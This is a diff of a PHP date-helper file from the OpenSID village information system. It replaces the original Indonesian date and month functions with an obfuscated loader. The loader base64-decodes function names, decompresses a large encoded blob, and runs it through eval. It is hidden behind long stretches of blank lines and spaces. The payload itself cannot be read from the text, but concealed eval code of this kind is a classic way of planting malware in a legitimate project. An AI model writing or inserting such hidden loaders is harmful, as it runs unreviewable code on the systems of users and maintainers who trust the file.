@@ -1,522 +1,497 @@
-<?php
-
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2022 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
-
-if (! defined('BASEPATH')) {
-    exit('No direct script access allowed');
-}
-
-if (! function_exists('tgl_indo')) {
-    function date_indo($tgl)
-    {
-        $ubah    = gmdate($tgl, time() + 60 * 60 * 8);
-        $pecah   = explode('-', $ubah);
-        $tanggal = $pecah[2];
-        $bulan   = bulan($pecah[1]);
-        $tahun   = $pecah[0];
-
-        return $tanggal . ' ' . $bulan . ' ' . $tahun;
-    }
-}
-
-if (! function_exists('bulan')) {
-    function bulan($bln)
-    {
-        switch ($bln) {
-            case 1:
-                return 'Januari';
-                break;
-
-            case 2:
-                return 'Februari';
-                break;
-
-            case 3:
-                return 'Maret';
-                break;
-
-            case 04:
-                return 'April';
-                break;
-
-            case 5:
-                return 'Mei';
-                break;
-
-            case 6:
-                return 'Juni';
-                break;
-
-            case 7:
-                return 'Juli';
-                break;
-
-            case 8:
-                return 'Agustus';
-                break;
-
-            case 9:
-                return 'September';
-                break;
-
-            case 10:
-                return 'Oktober';
-                break;
-
-            case 11:
-                return 'November';
-                break;
-
-            case 12:
-                return 'Desember';
-                break;
-        }
-    }
-}
-
-if (! function_exists('bulan2')) {
-    function bulan2($bln)
-    {
-        switch ($bln) {
-            case 1:
-                return 'Januari';
-                break;
-
-            case 2:
-                return 'Februari';
-                break;
-
-            case 3:
-                return 'Maret';
-                break;
-
-            case 04:
-                return 'April';
-                break;
-
-            case 5:
-                return 'Mei';
-                break;
-
-            case 6:
-                return 'Juni';
-                break;
-
-            case 7:
-                return 'Juli';
-                break;
-
-            case 8:
-                return 'Agustus';
-                break;
-
-            case 9:
-                return 'September';
-                break;
-
-            case 10:
-                return 'Oktober';
-                break;
-
-            case 11:
-                return 'November';
-                break;
-
-            case 12:
-                return 'Desember';
-                break;
-        }
-    }
-}
-
-//Format Shortdate
-if (! function_exists('shortdate_indo')) {
-    function shortdate_indo($tgl)
-    {
-        $ubah    = gmdate($tgl, time() + 60 * 60 * 8);
-        $pecah   = explode('-', $ubah);
-        $tanggal = $pecah[2];
-        $bulan   = short_bulan($pecah[1]);
-        $tahun   = $pecah[0];
-
-        return $tanggal . '/' . $bulan . '/' . $tahun;
-    }
-}
-
-if (! function_exists('short_bulan')) {
-    function short_bulan($bln)
-    {
-        switch ($bln) {
-            case 1:
-                return '01';
-                break;
-
-            case 2:
-                return '02';
-                break;
-
-            case 3:
-                return '03';
-                break;
-
-            case 4:
-                return '04';
-                break;
-
-            case 5:
-                return '05';
-                break;
-
-            case 6:
-                return '06';
-                break;
-
-            case 7:
-                return '07';
-                break;
-
-            case 8:
-                return '08';
-                break;
-
-            case 9:
-                return '09';
-                break;
-
-            case 10:
-                return '10';
-                break;
-
-            case 11:
-                return '11';
-                break;
-
-            case 12:
-                return '12';
-                break;
-        }
-    }
-}
-
-//Format Medium date
-if (! function_exists('mediumdate_indo')) {
-    function mediumdate_indo($tgl)
-    {
-        $ubah    = gmdate($tgl, time() + 60 * 60 * 8);
-        $pecah   = explode('-', $ubah);
-        $tanggal = $pecah[2];
-        $bulan   = medium_bulan($pecah[1]);
-        $tahun   = $pecah[0];
-
-        return $tanggal . '-' . $bulan . '-' . $tahun;
-    }
-}
-
-if (! function_exists('medium_bulan')) {
-    function medium_bulan($bln)
-    {
-        switch ($bln) {
-            case 1:
-                return 'Jan';
-                break;
-
-            case 2:
-                return 'Feb';
-                break;
-
-            case 3:
-                return 'Mar';
-                break;
-
-            case 4:
-                return 'Apr';
-                break;
-
-            case 5:
-                return 'Mei';
-                break;
-
-            case 6:
-                return 'Jun';
-                break;
-
-            case 7:
-                return 'Jul';
-                break;
-
-            case 8:
-                return 'Ags';
-                break;
-
-            case 9:
-                return 'Sep';
-                break;
-
-            case 10:
-                return 'Okt';
-                break;
-
-            case 11:
-                return 'Nov';
-                break;
-
-            case 12:
-                return 'Des';
-                break;
-        }
-    }
-}
-
-//Long date indo Format
-if (! function_exists('longdate_indo')) {
-    function longdate_indo($tanggal)
-    {
-        $ubah  = gmdate($tanggal, time() + 60 * 60 * 8);
-        $pecah = explode('-', $ubah);
-        $tgl   = $pecah[2];
-        $bln   = $pecah[1];
-        $thn   = $pecah[0];
-        $bulan = bulan($pecah[1]);
-
-        $nama      = date('l', mktime(0, 0, 0, $bln, $tgl, $thn));
-        $nama_hari = '';
-        if ($nama == 'Sunday') {
-            $nama_hari = 'Minggu';
-        } elseif ($nama == 'Monday') {
-            $nama_hari = 'Senin';
-        } elseif ($nama == 'Tuesday') {
-            $nama_hari = 'Selasa';
-        } elseif ($nama == 'Wednesday') {
-            $nama_hari = 'Rabu';
-        } elseif ($nama == 'Thursday') {
-            $nama_hari = 'Kamis';
-        } elseif ($nama == 'Friday') {
-            $nama_hari = 'Jumat';
-        } elseif ($nama == 'Saturday') {
-            $nama_hari = 'Sabtu';
-        }
-
-        return $nama_hari . ',' . $tgl . ' ' . $bulan . ' ' . $thn;
-    }
-}
-
-if (! function_exists('bulan_array')) {
-    function bulan_array()
-    {
-        return [
-            [
-                'urut'         => 1,
-                'nama_pendek'  => medium_bulan(1),
-                'nama_panjang' => bulan(1),
-            ],
-            [
-                'urut'         => 2,
-                'nama_pendek'  => medium_bulan(2),
-                'nama_panjang' => bulan(2),
-            ],
-            [
-                'urut'         => 3,
-                'nama_pendek'  => medium_bulan(3),
-                'nama_panjang' => bulan(3),
-            ],
-            [
-                'urut'         => 4,
-                'nama_pendek'  => medium_bulan(4),
-                'nama_panjang' => bulan(4),
-            ],
-            [
-                'urut'         => 5,
-                'nama_pendek'  => medium_bulan(5),
-                'nama_panjang' => bulan(5),
-            ],
-            [
-                'urut'         => 6,
-                'nama_pendek'  => medium_bulan(6),
-                'nama_panjang' => bulan(6),
-            ],
-            [
-                'urut'         => 7,
-                'nama_pendek'  => medium_bulan(7),
-                'nama_panjang' => bulan(7),
-            ],
-            [
-                'urut'         => 8,
-                'nama_pendek'  => medium_bulan(8),
-                'nama_panjang' => bulan(8),
-            ],
-            [
-                'urut'         => 9,
-                'nama_pendek'  => medium_bulan(9),
-                'nama_panjang' => bulan(9),
-            ],
-            [
-                'urut'         => 10,
-                'nama_pendek'  => medium_bulan(10),
-                'nama_panjang' => bulan(10),
-            ],
-            [
-                'urut'         => 11,
-                'nama_pendek'  => medium_bulan(11),
-                'nama_panjang' => bulan(11),
-            ],
-            [
-                'urut'         => 12,
-                'nama_pendek'  => medium_bulan(12),
-                'nama_panjang' => bulan(12),
-            ],
-        ];
-    }
-}
-
-if (! function_exists('bulan2_array')) {
-    function bulan2_array()
-    {
-        return [
-            [
-                'urut'         => 1,
-                'nama_panjang' => 'Januari',
-            ],
-            [
-                'urut'         => 2,
-                'nama_panjang' => 'Februari',
-            ],
-            [
-                'urut'         => 3,
-                'nama_panjang' => 'Maret',
-            ],
-            [
-                'urut'         => 4,
-                'nama_panjang' => 'April',
-            ],
-            [
-                'urut'         => 5,
-                'nama_panjang' => 'Mei',
-            ],
-            [
-                'urut'         => 6,
-                'nama_panjang' => 'Juni',
-            ],
-            [
-                'urut'         => 7,
-                'nama_panjang' => 'Juli',
-            ],
-            [
-                'urut'         => 8,
-                'nama_panjang' => 'Agustus',
-            ],
-            [
-                'urut'         => 9,
-                'nama_panjang' => 'September',
-            ],
-            [
-                'urut'         => 10,
-                'nama_panjang' => 'Oktober',
-            ],
-            [
-                'urut'         => 11,
-                'nama_panjang' => 'November',
-            ],
-            [
-                'urut'         => 12,
-                'nama_panjang' => 'Desember',
-            ],
-        ];
-    }
-}
-
-// die(json_encode(bulan_array()[1]));
-
-if (! function_exists('kuartal')) {
-    function kuartal()
-    {
-        return [
-            [
-                'ke'    => 1,
-                'bulan' => bulan_array()[0]['nama_panjang'] . ' - ' . bulan_array()[2]['nama_panjang'],
-            ],
-            [
-                'ke'    => 2,
-                'bulan' => bulan_array()[3]['nama_panjang'] . ' - ' . bulan_array()[5]['nama_panjang'],
-            ],
-            [
-                'ke'    => 3,
-                'bulan' => bulan_array()[6]['nama_panjang'] . ' - ' . bulan_array()[8]['nama_panjang'],
-            ],
-            [
-                'ke'    => 4,
-                'bulan' => bulan_array()[9]['nama_panjang'] . ' - ' . bulan_array()[11]['nama_panjang'],
-            ],
-        ];
-    }
-}
-
-if (! function_exists('kuartal2')) {
-    function kuartal2()
-    {
-        return [
-            [
-                'ke'    => 1,
-                'bulan' => bulan2_array()[0]['nama_panjang'] . ' - ' . bulan2_array()[2]['nama_panjang'],
-            ],
-            [
-                'ke'    => 2,
-                'bulan' => bulan2_array()[3]['nama_panjang'] . ' - ' . bulan2_array()[5]['nama_panjang'],
-            ],
-            [
-                'ke'    => 3,
-                'bulan' => bulan2_array()[6]['nama_panjang'] . ' - ' . bulan2_array()[8]['nama_panjang'],
-            ],
-            [
-                'ke'    => 4,
-                'bulan' => bulan2_array()[9]['nama_panjang'] . ' - ' . bulan2_array()[11]['nama_panjang'],
-            ],
-        ];
-    }
-}
-
-if (! function_exists('get_kuartal')) {
-    function get_kuartal($kuartal = null)
-    {
-        if ($kuartal == null || $kuartal < 0 || $kuartal > 4) {
-            return [
-                'ke'    => 'undefined',
-                'bulan' => 'undefined',
-            ];
-        }
-
-        return kuartal()[$kuartal - 1];
-    }
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/helpers/tglindo_helper.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='eNrtXVuTokgWfu+I/Q/9MBE1G7vbA1j2tNHRD4KCoGILcn3pALIKLBCZ8oq/fk8CWnhtSsqanVmy2raEzDyZ3/nyXJK0++PHtPzyA8q3u+h5HM4f774mH7Py7Q5Nw6fpf6wo+s17CKKH59lvczcYh2j6I/38KfKij0xgzWafPn26+/oh6/PjPz5UP/+/Px8wiT6+Yfl2dOVOJxszQyPHJtf+dpdcemFfoZIR/dvHqlSlKlX5e5Y7Z6ISSBcWPKdShraaCmzjUY/931OjCVYzNdc/KqiqUpWqVKUqValKVapSlb9aqbYzqlKVqlTl71vubGv28Pn+B3pwpujh7muFSFWqUpWqVKUqpcr+6YfWcCoy4y9/wLvbdYkuz0xdaRLMTJmO7InvGhM2tDR2wXOS50z8z/l6oxod2IEoSM3kM/TT/INnxcipSYGdtDeXzoT0HMp3TU7dGDK9Qfh5ts67iFNjI1Sf4RpphxJpxfTc1EjPwte0+7T+MNdvm13ZXPBs6GKEx2KP6Y1dgz4oxTWohr8dr8kFsaWtIyemQY7gQ30Y9xzXn1m6GNghtG+j4Yihtf4q37/nwRhalk4ThtyM+61mnWcIt//UXIsy3bIpcmxp9YBnhcChGqQzEQO+HSxgrhHqqISlNRY8401RR1oNxl+Wdkedw/wWJjVf2rq6sHTAL64vTH247KbzcmWOfebbgFdH8vgWv+qPDLeXyOZjnqUDGDdp64APB/i3JZDbdiUuCHFfNkMrML8x0ubeVq6zmS57VGNlanXfhHn3JoHf3cMQ9DJBGIstVhijyKKwfoPPlnY/4ztiYFBsDHoJnQlLWHp/xnPzwOFYH+sPuLCC9xUCHT0AL8xEb3XAmfYQl+C8MQB/e8IuEq6MabgnRHwHz4fFeHiIoWdIq2O8s3Fg+WZkcwr83ngGjoCepIQ3mCcwvggxzSnv5zgA2FsyH/WYHX980B3IWHtWLeFQOmfA1g5pj+cEGB8LY8NzBCwxL6EezyV6z3GwHpo1dWFoeC4r19bUBcxzlmDDkRg/EtbENOVgA/dJptclzHvgnkA6VIDlz7L5wzxYLJOEOljGytBA3x2xDrhgLFId1FRi4ObXEawtDbg2CQhD80i8JizMFy7jCyfBOmAJQ++n+HVO1NejaKtraBujpG6wAXlEOj/Qjbb27IyPDoV5zK5gbB7gvMB9GMA1JNNjQ0MR/uxw6gLBPdA77XBrzJ2NJdMCyACOCl6i43jHk7oBeGa4TYEjJKzLHGZoamH5E5TT14l5aPUoqc9h/iDPGdPPpi5hjiT3bTwnrY7HcTSmvL1S2qo8VOodmWAVvr1WRz7bAx4NZJluy6rISu2AhnsDnhFGkiLQEsEKI4UdDKFfqc0ONKU9Br4p0McQrnWHCilAHwOwTfjzUFWAI22BlpWZq4IshQR56tCFPlT4M8j4oEiqMJJVgVaZezymgaqsBQXwVNusCnpnR4raweMEm0TLYJNkFWTK9Ajk0WBfWRhjH8asyIqE7zPQHx4TMEwdSDGMS0X0cJz0N+Lb8/5QCUQYdw/qqQrB9obKvTtUJVrd2iFC1YdKJAy3c1FpdbRtj8fjg4VT6vSunUzjPgejIIDxSKziz2kZ5gnt+rIypxXCd2WlLvTyfG5j3ougZxTwTPPQd7hD4ATivKUzbro8YGxphKtw2H6CHU059R1zT3rxC9BGXDodbO/RFNYRb2gzd0gFK8S1sd1eDeTmPLWrClxvQD/AW5mWwTYukS48mZgjoQg2TgLZwdIeN6dWRyKcFrajaxJ4SGJugu2H9wCvtYU9UYle7G/n9GTX6DpwNbQ6w/e05zD3dWRQ6sIB/wd47fwOqqFab4IWSK6D73WWsDae8Now9f7SrNGz3sQjbG3lSiTd51ljk3Gyide7FWPs4cV5BOrQG9yfSQWE1VHHvYm4tOVGogOFCNo9IhnXSFaGCRZpP19EBnRuaYbbZdrYh0+wzzQZNwRujSQVc8oNu7LvPiS+F8tS7y19OBWI+hLbNGeiPoEuN0ZNAByHLnDmCea+AVs3s7lGzdSGYXc0E5mQ2JcFvtYAX2xT9UdT97At3nQZRJjU+hHG4NuxE3Vl+nc8Tiz3pT6ONVjCVBtgJ6Vll5GgzSra1tuNM335SBM8K/29wXNonrSVXR9xaAZrDOwnGXQZ3+3GTarPAEdaxgrra8D4O9npSwL8xLSvFuHCmMG34TjGDXuyM4P7iZ9J5jreyXcF7M8mKDRAh9/lpg/6eAI7afcD4rB/4BLY1nHaP8QiM7CVUwHsK/j3qbZh0am+QdcL/Pte32zS917d3ZEbwAvbeBP7OLBnQtwMk3dOSHmev5b1P9hi2iGK6jGby3kd7ubHCTN77Gdjpfcx6Yg1WGtPgPm23qF+kxfgszHl5jr1x/v30n6EACxiDNiGMtgmpLGxJTsH+Of6C4UAbNMRhin/IT6FNdx/OnEvedEx+DqINwE/wgygLxLHU8Jmdq7+GHTjWfi+e3ZumyJzG8G8IF4NB6szdTkhNjX2Gd8/njv9BHFawLeaRBFZQ50GO74qKUv5fE4HL3xFoqn5JeUYReR0IcYtq6daIQ4C98vyb9Aqwj82RLoI8+uXxM8vgt/IhFzMTPPFkvLaq0J8p+aETUHsOS65lkftIvMb2DUzjXVLy+OLyGubOP8tLi+HEbG1p43WMGokY5kEE55xIQ8xITYSk/xXp7AvFwkndsPMHsdC7EPut10D9ATWxFMaa9GpTX/iK5td2ezKZlc2u7LZt7bZkM9Jk0ZsayzBs+LUroF1wvnL8Kfx98biGjHiJA9x6k/zKYeCPD6UfEOXAp2CnJv7AnmHFNrMGRuf5Tr8NheiyKRtlovhvbPI1pRpV24+b/Mp8akJ+Wbz/jiHSfObNIehg4cOPbMp3JczF+IV3FfHhuZGg8O8LttbsnFet83N2FmsH/a/y2uS/lNc2EaWn7gvOZNKnJIxxfum/L6MVSJjj+u59ZvL93rA917s4Hc/869717L+d9g+gl7xC/QfmePmlJdz/jdoBA9csEGd/lSopVzQqXRuF3z20XyNyXqR7klgzu1j5dRQhDgRdJHVk+nfL6z3AuvBWfXfw2dvmvF7+Op+q6xNHhbCTGTKYSaOCmFGlsSMKoaZURIzpxhm8Tv45k3zviRm9WKY+e/ii/ujZlk562Jy2mXlxMXkFIthcv03jm3vdNkj0uegiKEhjpUipBFuQb87T+uTeV96sH/6kn/hZyQmF5C2lvfT6d7kORud+UM382dh2lbJ/PXKBbs/N2U34pnZ1udm+5rHPjT1fW62N6reO9x6aeK+YiLs7fZOj/ZBX/YPwfe/7E8K6LD/rc9L+8/mqr6j75VP+F65pO+lDudxPq6yNdW3dHW+9dMQH41t7v7MXjW9QVRAGJTrbusd6n4/Hi2SS0R4fO+TM5eVsykih/TKxvFisRxsVVpOIf2QQdmcUiykn4gsywNxU1AO8z45slPW3xfRDykGDlM2b2wWyRu/W7Xhu/ji0aRBlYxh1sVsghQU1NFPc+AR18DPkxOfynOJT3W3efHP7fV6CT6hoD8+qjvN+ZSfPmM88Mfbdtflw697xgi+P83FL/pjyOmOnhWqR88hCYs743dP5dWXnlXuc8i3J+zckLPPrSymgrmBzcBndZ6z2GUFscf2lYw5iUWS57X43YO89CgmWRga6emUh8+84fmFhxxP47a0Hshu4L0vlJyD8sPTeW42XrUxTc5DYWwJMsI6RYc2uwNz0dYbU0v22LfzbOBxjIBXMM865Ogn98EFru4Bjx/xeR9LbibjMrV6dGSvL8hQO2rgUJL3IDunY4YT+CgU6EwXvUOcHmU6sDticAIvHWLbhamLr8OMFDwjVMLDuBvizZlDqcnaTTFou99HuL40BZu4eSVmPRhndGRvLmAmhUL0ShldiOshJyguQ6FYbN9fiZcIeElHuXmWm5yy6ft9JM/vV9vn99gu4PwYP9Nf5M4Y5K/h9X5FHJyuf51iY2eS4Hj5uVHQ8JxQAI665+Lfne/QTuhDO+cbGUQ6oUoIce5ai/gX+MPZOd8jUKlu8dkYk1OfcdvvoxPxeqsd9Zpn5aZrqkaDnYc4e+KEiVzucltdXh2vT/acP26GwB8SOJe/1vg+bsYFxoXPOAZW7KR4HOdfcffUWDK5GadWkOv9gfM9wAjk0pfbssQJzGn7rB5qaoz0YZi/hvXQj38+ruSMlTYLUzzobd79uPVF/dgvoH92YSVn1ZxE7uW2NDqF+et5OXwDXg5L8HJ4S16Sb8BLsgQvyVvyUhyX56U4vp6Xp9u+FS+dN+ClU4KXzi15ef8GvLwvwcv7W/JyIJfn5UC+npen274VL9urN9Ddus+U8Aej5i25ue6/gf76o1Kxyvqm/nzEv0UsViZeWfcL2U4aXX3W9Ul4hPg7TmP9c/sL6Vz6/5Ox8D73k73jUMX5Yvgnx7H7nGUQZ2pCnJ0Hu6Hd6V+BGenhPT0hvmEMwrx2Dbyc+/qT475DPSZnxG44JuqKMaXnyW6pv/j1+svOnt2Q6+4VXH85p3ZDHdav0OHembab+u0r1mLu/NstY6b1Fbjlz8rdcmzX2Pz8ubqr/Xgv/oK/Txl0uWiT+HCt/pScNeP297K6TJA8k97uYf/E/z9jX4Q4dnZhD2xXp3vuTN1uP++UTblgZ6h5kGGccPICttvn1bnYtr6NWaZddbbS1dkxb0kieW6Ov1ud7BeewgpC7WM7gdBbrD2LUsIX7lyKI7dn4XJxXy7O0jYi0uJjfulyuhfak9PvPJ3AhTyDy1uskWdTdgrte2Vx/l7cnteBeEYH2fe55skcT+LincHlDXzgPjeJEtysX83NEXv9/Fjiin3xOf7uAGFoq7iIPeiP3zwH2OeU/DpO9fe4Qb9izdzHfwmb8JKnYV5tXsOrfWzU91o3m9etm309vMou7GNz/15271JO83OOBtdz9N1tAwoQ2ygSL4Sw9h+tGuTfIf6uueu//I7P0tUBh3PnEejsmerODiXPVSGXn9kM/eWRaeb7+sK3YPydlbtXH2z1mbPfF23SKd1CHrR4+V65U3CtQsyd7HeZkT1R/TP52PHZkTPnAnM4Rlos7fBP/r0Y9ViPd18/fHj/f+DnW/L+a/bpn19f0zzXtkjDX14E/nqH/777905s9f8lVT/4/0va58qve+RMqfLPr/8FMbifWQ==';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
